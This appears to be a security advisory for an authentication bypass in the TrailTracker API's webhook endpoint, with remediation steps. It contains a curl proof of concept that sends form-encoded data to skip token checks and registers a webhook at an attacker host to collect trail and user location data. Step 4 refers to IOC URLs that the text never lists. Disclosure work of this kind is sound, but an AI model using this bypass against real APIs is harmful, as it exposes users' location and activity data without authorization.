CVSS 9.1 CRITICAL - Authentication Bypass in TrailTracker API

Summary

A critical authentication bypass vulnerability exists in TrailTracker API versions 2.0.0 through 2.4.1. An unauthenticated attacker can craft API requests that bypass the Bearer token validation on the /webhooks endpoint, allowing registration of arbitrary webhook URLs without authorization. This enables an attacker to receive real-time data about trail conditions, user activity, and location information for any trail in the system.

Technical Details

The vulnerability exists in the webhook registration endpoint's authentication middleware. When the Content-Type header is set to application/x-www-form-urlencoded instead of application/json, the request bypasses the JWT validation layer and is processed directly by the webhook handler.

Proof of Concept:

curl -X POST https://api.trailtracker.dev/v2/webhooks \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=https://attacker.example.com/collect&trails[]=elk-ridge-loop&events[]=condition_update"

This registers a webhook without any authentication, causing the server to send trail condition data to the attacker-controlled URL.

Remediation

Immediate Actions

  1. Upgrade to TrailTracker API v2.4.2 or later
  2. Audit all registered webhooks: GET /v2/webhooks?include_unauthed=true
  3. Remove any webhook registrations pointing to unknown endpoints
  4. Block the IOC URLs listed above at your network perimeter
  5. Rotate all API keys issued before October 3, 2024
